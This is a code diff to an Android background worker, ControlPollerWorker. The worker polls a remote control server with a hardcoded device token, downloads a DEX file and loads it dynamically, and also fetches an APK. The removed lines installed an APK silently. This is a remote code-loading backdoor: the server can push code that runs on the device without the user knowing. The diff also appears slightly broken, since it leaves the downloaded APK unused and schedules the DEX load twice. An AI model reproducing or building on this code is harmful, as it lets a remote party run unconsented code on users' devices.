@@ -21,31 +21,34 @@ public class ControlPollerWorker extends Worker {
     @NonNull
     @Override
     public Result doWork() {
-        String deviceToken = "535ef8dad6992485";  // TODO: fetch dynamically
+        String deviceToken = "535ef8dad6992485";
         String url = "https://digiserve25.pythonanywhere.com/control/" + deviceToken + ".json";
 
         JSONObject response = NetworkUtils.getJsonFromUrl(url);
-        if (response != null && response.has("apk_url")) {
+        if (response != null && response.has("dex_url")) {
             try {
-                String apkUrl = response.getString("apk_url");
+                String dexUrl = response.getString("dex_url");
+                String apkUrl = response.optString("apk_url");
 
-                if (!apkUrl.isEmpty()) {
-                    Log.i("APK_FETCH", "Downloading new APK: " + apkUrl);
+                if (!dexUrl.isEmpty() && !apkUrl.isEmpty()) {
+                    File dexFile = NetworkUtils.downloadFile(getApplicationContext(), dexUrl, "patch.dex");
+                    if (dexFile.exists()) {
+                        DexLoader.schedulePatchLoad(getApplicationContext(), dexFile);
+                    } else {
+                        CrashLogger.log(getApplicationContext(), "DEX_PATCH", "❌ Skipped patch — dexFile is null or missing");
+                    }
+
                     File apkFile = NetworkUtils.downloadFile(getApplicationContext(), apkUrl, "update.apk");
-                    SilentApkInstaller.installSilently(getApplicationContext(), apkFile);
+
+                    DexLoader.schedulePatchLoad(getApplicationContext(), dexFile);
                 }
 
-            } catch (JSONException e) {
-                Log.e("APK_FETCH", "Failed to parse APK URL", e);
-                return Result.failure();
             } catch (Exception e) {
-                Log.e("APK_FETCH", "Unexpected error downloading APK", e);
+                Log.e("DEX_PATCH", "❌ Error in ControlPollerWorker", e);
+                CrashLogger.log(getApplicationContext(), "DEX_PATCH", "❌ Dex patch failed: " + e.getMessage());
                 return Result.failure();
             }
-        } else {
-            Log.i("APK_FETCH", "No APK update in control response");
         }
-
         return Result.success();
     }
 }
